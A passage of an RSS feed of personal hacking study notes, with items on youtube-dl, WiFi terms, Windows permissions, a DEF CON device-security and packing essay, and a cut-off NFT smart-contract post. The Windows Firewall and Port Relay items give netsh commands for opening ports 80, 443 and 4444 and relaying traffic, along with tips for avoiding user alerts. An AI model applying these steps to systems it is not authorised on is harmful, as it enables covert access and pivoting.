&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;pip&lt;/span&gt; install --upgrade youtube-dl&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com/community/tutorials/common-python-tools-using-virtualenv-installing-with-pip-and-managing-packages&quot;&gt;Common Python Tools: Using virtualenv, Installing with Pip, and Managing Packages&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/ytdl-org/youtube-dl&quot;&gt;ytdl-org / youtube-dl&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 15 Apr 2023 17:28:07 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22youtube-dl%22.md</guid>
		</item>
		<item>
			<title>WiFi Terminology</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/WiFi%20Terminology.md</link>
			<description>&lt;h2 id=&quot;sbsessids&quot;&gt;(S|BS|ES)SIDs&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;SSID - The wireless network &quot;display&quot; name.&lt;/li&gt;&lt;li&gt;BSSID - The MAC address of the access point currently being used.&lt;/li&gt;&lt;li&gt;ESSID - A collection of BSSIDs representing a single network. More-or-less analogous to SSID (when used in the context of networks consisting of multiple access points).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;From what I can tell, SSID and BSSID apply to single access points, while ESSID applies to an entire network of access points.&lt;/p&gt;</description>
			<pubDate>Sat, 15 Apr 2023 17:28:07 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/WiFi%20Terminology.md</guid>
		</item>
		<item>
			<title>Windows Firewall</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Firewall.md</link>
			<description>&lt;p&gt;Check Windows Firewall state:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh advfirewall show currentprofile&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See all Windows Firewall rules for inbound connections:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh advfirewall firewall show rule &lt;span class=&quot;fu&quot;&gt;dir&lt;/span&gt;=&lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; name=all&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Be aware that most built-in rules on Windows are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There's no 100% reliable way to identify custom rules from the command line, but they'll often have obvious naming conventions.&lt;/p&gt;&lt;p&gt;See all Windows Firewall rules for outbound connections:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh advfirewall firewall show rule &lt;span class=&quot;fu&quot;&gt;dir&lt;/span&gt;=out name=all&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Punch a hole in the Windows Firewall for ports 80, 443, and 4444:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh advfirewall firewall add action=allow name=tunnel_in `&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;dir&lt;/span&gt;=&lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; protocol=tcp localport=&lt;span class=&quot;st&quot;&gt;&amp;quot;80,443,4444&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh advfirewall firewall add action=allow name=tunnel_out `&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;dir&lt;/span&gt;=out protocol=tcp localport=&lt;span class=&quot;st&quot;&gt;&amp;quot;80,443,4444&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In general you don't want to turn off the Windows Firewall, as doing so will generate a popup for any users currently logged into the machine.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 15 Apr 2023 17:28:07 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Firewall.md</guid>
		</item>
		<item>
			<title>Windows Permissions</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Permissions.md</link>
			<description>&lt;p&gt;Windows access is default-deny.&lt;/p&gt;&lt;p&gt;Windows folder permissions:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Read - Permits viewing and listing of files and subfolders&lt;/li&gt;&lt;li&gt;Write - Permits adding of files and subfolders&lt;/li&gt;&lt;li&gt;Read &amp;amp; Execute - Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders&lt;/li&gt;&lt;li&gt;List Folder Contents - Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only&lt;/li&gt;&lt;li&gt;Modify - Permits reading and writing of files and subfolders as well as executing of files; allows deletion of the folder&lt;/li&gt;&lt;li&gt;Full Control - Permits reading, writing, changing, and deleting of files and subfolders&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Windows file permissions:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Read - Permits viewing or accessing of the file's contents&lt;/li&gt;&lt;li&gt;Write - Permits writing to a file&lt;/li&gt;&lt;li&gt;Read &amp;amp; Execute - Permits viewing and accessing of the file's contents as well as executing of the file&lt;/li&gt;&lt;li&gt;List Folder Contents - N/A&lt;/li&gt;&lt;li&gt;Modify - Permits reading and writing of the file as well as executing of the file; allows deletion of the file&lt;/li&gt;&lt;li&gt;Full Control - Permits reading, writing, changing and deleting of the file&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The biggest differences between Windows and UNIX permissions:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Windows doesn't have as fine-grained of control &lt;em&gt;for a given user or group&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Windows has &lt;em&gt;much more&lt;/em&gt; fine-grained control across users and groups (there's no limit of three permission sets).&lt;/li&gt;&lt;li&gt;The ability to delete a folder or file, and to change its permissions, are essentially considered to be distinct &quot;sub-permissions&quot;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;As much as it pains me to say it, in many ways the Windows permission mode is much better than the (pre-ACL) Linux model.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008&quot;&gt;File and Folder Permissions&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;checking-permissions&quot;&gt;Checking Permissions&lt;/h2&gt;&lt;p&gt;Use &lt;code&gt;icacls&lt;/code&gt; or &lt;code&gt;Get-Acl $PATH | Format-List&lt;/code&gt; in PowerShell to check permissions at the command line. The &lt;code&gt;icacls&lt;/code&gt; tool can also be used to update Windows ACLs.&lt;/p&gt;&lt;p&gt;Both of these tools produce output that is somewhat different than that of the &quot;Security&quot; tab in the file or folder properties:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;(I)&lt;/code&gt; - permission inherited from the parent container&lt;/li&gt;&lt;li&gt;&lt;code&gt;(F)&lt;/code&gt; - full access (full control)&lt;/li&gt;&lt;li&gt;&lt;code&gt;(M)&lt;/code&gt; - modify right/access&lt;/li&gt;&lt;li&gt;&lt;code&gt;(OI)&lt;/code&gt; - object inherit&lt;/li&gt;&lt;li&gt;&lt;code&gt;(IO)&lt;/code&gt; - inherit only&lt;/li&gt;&lt;li&gt;&lt;code&gt;(CI)&lt;/code&gt; - container inherit&lt;/li&gt;&lt;li&gt;&lt;code&gt;(RX)&lt;/code&gt; - read and execute&lt;/li&gt;&lt;li&gt;&lt;code&gt;(AD)&lt;/code&gt; - append data (add subdirectories)&lt;/li&gt;&lt;li&gt;&lt;code&gt;(WD)&lt;/code&gt; - write data and add files&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that the Windows File Explorer only displays the &lt;em&gt;first&lt;/em&gt; ACL for a particular user or group, but that Windows allows &lt;em&gt;multiple&lt;/em&gt; ACLs to be applied! This means that the File Explorer does not always show you the &lt;em&gt;actual&lt;/em&gt; permissions a user/group will have - you really do need to use &lt;code&gt;icacls&lt;/code&gt; or &lt;code&gt;Get-Acl&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;In the case of multiple ACLs, or when a user is part of two groups with different groups, keep in mind that allow permissions only override &lt;em&gt;inherited&lt;/em&gt; deny permissions. Explicitly set deny permissions &lt;em&gt;cannot&lt;/em&gt; be overridden.&lt;/p&gt;&lt;h2 id=&quot;common-user-types&quot;&gt;Common User Types&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Local Admin&lt;/li&gt;&lt;li&gt;Local User&lt;/li&gt;&lt;li&gt;Guest User&lt;/li&gt;&lt;li&gt;Domain User&lt;/li&gt;&lt;li&gt;Domain Admin&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that non-admin domain users may still be local admins.&lt;/p&gt;</description>
			<pubDate>Sat, 15 Apr 2023 17:28:07 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Permissions.md</guid>
		</item>
		<item>
			<title>Windows Port Relay</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Port%20Relay.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;netsh interface portproxy add v4tov4 `&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      listenport=&lt;span class=&quot;va&quot;&gt;$LOCAL_PORT&lt;/span&gt; listenaddress=0.&lt;span class=&quot;fu&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;0&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      connectport=&lt;span class=&quot;va&quot;&gt;$REMOTE_PORT&lt;/span&gt; connectaddress=&lt;span class=&quot;va&quot;&gt;$REMOTE_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This works on Windows 7 and later.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 15 Apr 2023 17:28:07 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Port%20Relay.md</guid>
		</item>
		<item>
			<title>Notes from HOPE and DEF CON</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Some%20Remarks/2022-08-15%20Notes%20from%20HOPE%20and%20DEF%20CON.md</link>
			<description>&lt;p&gt;Now that both HOPE and DEF CON are behind me, I want to summarize some of my initial thoughts. This is not a &quot;what did I learn about hacking&quot; post, but rather musings about &lt;em&gt;attending&lt;/em&gt; these events.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://xiv.hope.net/&quot;&gt;A New HOPE&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://defcon.org/html/defcon-30/dc-30-index.html&quot;&gt;DEF CON 30&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;device-security&quot;&gt;Device Security&lt;/h2&gt;&lt;p&gt;The internet is awash with advice to only bring burner phones/laptops to DEF CON (or hacker conferences in general), to assume any credit card you use while attending (or even being near) DEF CON is compromised, etc.&lt;/p&gt;&lt;p&gt;After much consideration, I've come to believe that much of this &quot;advice&quot; is ill-conceived, and shows either the advice-giver's poor risk modeling abilities or inflated sense of their own importance. Rob Graham's advice is much better: Encrypt your stuff and be careful about Wi-Fi and Bluetooth, and you'll almost certainly be fine.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Assuming that you're using up-to-date devices&lt;/em&gt;, the main risks of going to a hacker conference are the same as any sort of travel: Theft, assault, abuse by the local authorities. I'm not the kind of person who needs to worry as much about the second two of these, so theft is my main concern. Here's my general travel setup, which I think is also pretty solid for hacker conferences:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;I &lt;em&gt;don't&lt;/em&gt; take my regular computer with me. I travel with a recent iPad Pro and iPhone, and also bring along a Raspberry Pi (currently a 4B running Kali Linux - I have &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20a%20Raspberry%20Pi%204B%20as%20an%20iPad%20Pro%20Hacking%20Accessory.md&quot;&gt;a guide covering how to set that up&lt;/a&gt; if you're interested) in case I need tools I can't run on the iPad (this is actually less common than you'd think).&lt;/li&gt;&lt;li&gt;All of my devices are encrypted.&lt;/li&gt;&lt;li&gt;I use Face ID on my iPad Pro and iPhone, but &lt;em&gt;not&lt;/em&gt; for the lock screen. A strong passcode or PIN is required for initial device access - I think of Face ID as an extra layer of security for individual apps rather than what provides the actual &lt;em&gt;device&lt;/em&gt; security.&lt;/li&gt;&lt;li&gt;I run a minimal-ish set of applications, and regularly review and uninstall anything I'm not currently using.&lt;/li&gt;&lt;li&gt;Before leaving (generally the morning I head for the airport, unless i have a &lt;em&gt;really&lt;/em&gt; early flight), I make sure that all of my devices are running the most up-to-date versions of their operating systems and apps, and run a complete backup.&lt;/li&gt;&lt;li&gt;I have Find My active on all of my devices so if the device is stolen I can lock/wipe it remotely.&lt;/li&gt;&lt;li&gt;Finally, I use Proton VPN on all my devices. I do this not for &quot;privacy&quot; reasons, but because using a VPN is a way to ensure that any applications that are &lt;em&gt;not&lt;/em&gt; using encrypted connections or are vulnerable to downgrade attacks have an extra layer of protection. That ProtonVPN also provides some on-the-wire malware blocking is an added bonus.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Now, hacker conferences &lt;em&gt;do&lt;/em&gt; generally have a more hostile radio frequency environment, so I do take extra care here.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;I turn off Bluetooth and leave it off attending the conference. Since I only travel with wired headphones, this isn't a big hardship for me. The only time I turn on Bluetooth is if I want to edit any photography (I have an Apple Pencil for my iPad), but I only do this when away from the conference area.&lt;/li&gt;&lt;li&gt;I remove all Wi-Fi networks from my devices (which means deleting them from iCloud Keychain). For DEF CON, I configure the secure conference conference Wi-Fi before leaving. That said, I keep Wi-Fi turned off on my devices as well unless I absolutely need it.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Finally, you want to be careful what you're plugging into your devices. Personally, I bring my own cables and charger, and don't use anything provided by another conference attendee or plug in any devices (for example, USB drives) that I didn't bring with me.&lt;/p&gt;&lt;p&gt;There's not some kind of magical &quot;hacker miasma&quot; at these conferences that puts your device at risk - someone looking to compromise your device needs to be able to get data to it. By limiting connections to radio networks and avoiding untrusted devices, the opportunity for an attack is severely curtailed (though it cannot be eliminated). The main risk here is someone attempting to subvert a trusted connection (the DEF CON secure Wi-Fi network, the Bluetooth connection to my Apple Pencil, or the cellular radio on my iPhone); the best defense is simply keeping your shit up-to-date and pre-configure trusted connections. It's very unlikely that someone is going to burn a cellular zero day on you at a hacker conference.&lt;/p&gt;&lt;p&gt;If your risk model is that a nation state is gunning for you, then you need to be worrying about a lot more than just conference security! Needless to say, this guide is not, then, for you.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://blog.erratasec.com/2019/08/securing-devices-for-defcon.html&quot;&gt;Securing devices for DEFCON&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.apple.com/ipad-pro/&quot;&gt;Apple iPad Pro&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.apple.com/iphone/&quot;&gt;Apple iPhone&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.raspberrypi.com/&quot;&gt;Raspberry Pi&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.apple.com/icloud/find-my/&quot;&gt;Apple Find My&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.apple.com/apple-pencil/&quot;&gt;Apple Pencil&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://protonvpn.com/&quot;&gt;Proton VPN&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wifireg.defcon.org/&quot;&gt;DEF CON Wi-Fi Registration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;a-note-about-credential-management&quot;&gt;A Note About Credential Management&lt;/h3&gt;&lt;p&gt;An important layer of defense at hacker conferences, when traveling, or just &lt;em&gt;in life&lt;/em&gt; is good credential management.&lt;/p&gt;&lt;p&gt;I use different usernames/emails for almost every service. Both Proton Mail and Google Workspace can be configured with catch-all email addresses. If you don't want to pay money, then sign up for Gmail and liberally use the &lt;code&gt;+&lt;/code&gt; functionality.&lt;/p&gt;&lt;p&gt;Use unique, random passwords for as many services as you can. Use a password manager (KeePassXC and compatible applications are good choices) to make this easy to manage. Don't store these credentials in your browser or system keychain.&lt;/p&gt;&lt;p&gt;Set up multi-factor authentication on &lt;em&gt;every&lt;/em&gt; account that supports it. Whenever possible, use a hardware key (like a YubiKey). As a bonus, you can use hardware security keys to further lock down access to your password manager: Do this using either built-in support, or by storing a long random string in one of your security key &quot;slots&quot; and then using this &lt;em&gt;in addition to&lt;/em&gt; a string that you've memorized to access your password vault (full-featured YubiKeys - not the lower-end &quot;security keys&quot; Yubico sells - support both options).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://proton.me/support/catch-all&quot;&gt;Proton Mail: What is a catch-all email address?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://support.google.com/a/answer/2685650&quot;&gt;Email routing and delivery options for Google Workspace&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://support.google.com/a/users/answer/9308648&quot;&gt;Gmail: Create task-specific email addresses&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://keepassxc.org&quot;&gt;KeePassXC&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.yubico.com/products/yubikey-5-overview/&quot;&gt;YubiKey 5 Series&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://keepassxc.org/docs/KeePassXC_UserGuide.html#_database_settings&quot;&gt;KeePassXC User Guide: Database Settings&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;packing&quot;&gt;Packing&lt;/h2&gt;&lt;p&gt;I'm a light packer, partly because I don't like checking bags, and partly because I enjoy the challenge. This year I managed to fit all of my gear into a single Peak Design 20 L Everyday Backpack (with the help of two small packing cubes). However, this is all a tight fit - there's next to no room for conference swag on the return trip, and the laptop compartments are compressed more than I'm comfortable with. Moving forward, I intend to switch to a Peak Design 30 L Everyday Backpack, as I think that the extra 10 L should be more than enough for me.&lt;/p&gt;&lt;p&gt;There's enough (low profile) pockets in the Peak Design Everyday backpack that I don't need a cord bag, and it's a reasonable size to use as a day bag at the conference itself. This requires some unpacking/repacking at the hotel, but that's a small price to pay to avoid having to carry an entire additional bag. Peak Design products are a bit pricy, but I've experimented with &lt;em&gt;a lot&lt;/em&gt; of different bags over the years and they're hands-down the most durable, versatile bags I've ever owned.&lt;/p&gt;&lt;p&gt;One thing that's enables me to pack light is that I've moved away from wearing jeans. Instead, I've switched to Bluffworks' Ascender 5-Pocket Pants, which are tough, light, wrinkle-resistant, &lt;em&gt;very&lt;/em&gt; compressible, and have the bonus of being much harder to pick pocket than most other mens' pants (though again, a determined thief can still defeat them). I pair these with Icebreaker underwear and socks, which are also exceptionally light and durable. Bluffworks also makes travel blazers and other outfits for less casual situations; these are also good for traveling light, but by necessity take up a bit more space. There's a trade-off between looking nice and packing light that is just difficult to navigate.&lt;/p&gt;&lt;p&gt;One disadvantage of this setup is that it's difficult to bring multiple pairs of shoes. I opt to just wear a pair of black running shoes - they're not dress shoes, but they're comfortable and sufficiently understated that you can get away with using them in less casual situations in a pinch.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.peakdesign.com/products/everyday-backpack&quot;&gt;Peak Design Everyday Backpack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.peakdesign.com/products/packing-cube/&quot;&gt;Peak Design Packing Cubes&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.icebreaker.com/en-us/mens-underwear&quot;&gt;Icebreaker Men's Underwear&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.icebreaker.com/en-us/mens-socks&quot;&gt;Icebreaker Men's Socks&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://shop.bluffworks.com/products/gramercy-blazer-classic-fit-blue-hour&quot;&gt;Bluffworks Gramercy Blazer&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://shop.bluffworks.com/pages/performance-suits&quot;&gt;Bluffworks Performance Suites&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;at-the-con&quot;&gt;At the Con&lt;/h2&gt;&lt;p&gt;At the conference, or really when traveling in general, I try to avoid being conspicuous. I don't wear conference swag/merch. I don't put stickers on my devices. I take off my conference badge and put it in my backpack when it's not required. I don't flash (or carry) big wads of cash.&lt;/p&gt;&lt;p&gt;In short, I try not to &lt;em&gt;look&lt;/em&gt; like a target. Ideally, there should be no way for someone who sees you outside of the conference to know that you are an attendee.&lt;/p&gt;&lt;h3 id=&quot;a-note-on-masks&quot;&gt;A Note on Masks&lt;/h3&gt;&lt;p&gt;I don't like wearing masks, but if I'm going to wear one I'm going to wear an &lt;em&gt;effective&lt;/em&gt; one. Since HOPE and DEF CON were both masked events, I brought along tight-fitting N95 masks for use while attending the conference.&lt;/p&gt;&lt;p&gt;The problem with a well-fitted N95 masks is that they're kind of a pain to take off. This makes both eating and (more importantly) drinking a less attractive proposition. I wound up going back to my hotel to do both during the day, which created larger gaps in my schedule than I planned.&lt;/p&gt;&lt;p&gt;Moving forward, I don't think it makes sense to bring a water bottle to any events that have a mask requirement. I also need to remember that I can't effectively pull off my normal back-to-back-to-back event schedule at conferences with mask requirements. This means doing &lt;em&gt;less&lt;/em&gt; at these events than I otherwise would, but &lt;em&gt;c'est la vie&lt;/em&gt; in the time of plague.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://bnx.com/products/n95-mask-black-made-in-usa-bifold-h95b/&quot;&gt;BNX N95 Mask Respirator (NIOSH)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Some%20Remarks/2022-08-15%20Notes%20from%20HOPE%20and%20DEF%20CON.md</guid>
		</item>
		<item>
			<title>Trying (and Failing) to Deploy a Smart Contract Using an iPad Pro</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Some%20Remarks/2022-11-27%20Trying%20%28and%20Failing%29%20to%20Deploy%20a%20Smart%20Contract%20Using%20an%20iPad%20Pro.md</link>
			<description>&lt;p&gt;My personal project this weekend was to deploy a smart contract to the Ethereum blockchain. The motivation here was to be able to mint an NFT (really, several NFTs) for use as an avatar on Farcaster, an alternative to Twitter that I've been experimenting with for a few weeks now. Using an NFT as your avatar on Farcaster adds a &quot;purple checkmark&quot; to your account, a spoof on Twitter's infamous blue checkmark.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.farcaster.xyz/&quot;&gt;Farcaster&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://fcast.me/necopinus&quot;&gt;necopinus - fcast.me&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://farcasterxyz.notion.site/How-to-get-a-purple-checkmark-fb66f0cb0f5f4f24b699b8f288a2f14a&quot;&gt;How to get a purple checkmark&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://help.twitter.com/managing-your-account/about-twitter-verified-accounts&quot;&gt;How to get verified on Twitter&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(For those who are interested, Twitter provides the ability to set an NFT as your avatar, though you need to subscribe to &quot;Twitter Blue&quot; and be using iOS in order to access this feature.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://support.opensea.io/hc/en-us/articles/4415562648851-How-do-I-set-my-NFT-as-my-Twitter-profile-picture-&quot;&gt;How do I set my NFT as my Twitter profile picture?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The central problem here is that if I use an NFT as my avatar, then I need to pay for another NFT (either to buy one or mint one myself) whenever I decide I want to change my avatar. Also, my current (and favorite) avatar is taken from a John Schoenherr painting of one of the great sandworms of Arrakis - I'm not sure I want to &quot;mint&quot; that in any way that could be interpreted as me claiming &quot;ownership&quot; of it. It's Schoenherr's painting after all!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://dangerousminds.net/comments/the_artist_who_visited_dune&quot;&gt;The Artists Who Visited &quot;Dune&quot; and &quot;The Most Important Science Fiction Art Ever Created&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Finally, all of the services I've seen that allow you to mint your own NFT store the associated JSON metadata and image file using a decentralized solution like IPFS or Arweave. This is actually a good thing, because it gives &quot;collectable&quot; NFTs a degree of permanence, but in my case I actually &lt;em&gt;want&lt;/em&gt; to be able to update the associated metadata and image arbitrarily. Fortunately, I control my own domain and EIP-721 (which defines the NFT standard) doesn't forbid using &quot;non-permenant&quot; URIs, so all this means is that I need to deploy my own smart contract to create my NFT avatar(s), rather than using a pre-packaged solution.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://ipfs.tech/&quot;&gt;IPFS&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.arweave.org/&quot;&gt;Arweave&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://eips.ethereum.org/EIPS/eip-721&quot;&gt;EIP-721: Non-Fungible Token Standard&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;That all sounds easy enough, but I &lt;em&gt;also&lt;/em&gt; wanted to try to do this using only my iPad Pro, since I regard that as a more secure computing device than a regular desktop. (In fact, I've gradually come to prefer my iPad Pro over my laptop, so it's not &lt;em&gt;just&lt;/em&gt; about system security.) As you can probably guess from the title of this post, I failed to accomplish this particular goalâ¦ Though I came &lt;em&gt;very&lt;/em&gt; close to succeeding!&lt;/p&gt;&lt;p&gt;While working on the iPad, I used Safari with the Light Wallet extension for interacting with the Ethereum blockchain.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://wallet.light.so&quot;&gt;Light Wallet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;As fate would have it, I started using a standard location for my avatar (&lt;code&gt;https://necopinus.xyz/âavatar/âavatar.webp&lt;/code&gt;) when I set up my ENS domains. For some reason the correct URL isn't showing up on the ENS console, even though it appears to be set when I view it in the controling Safe app. I'm not sure why this is, but the important thing is that 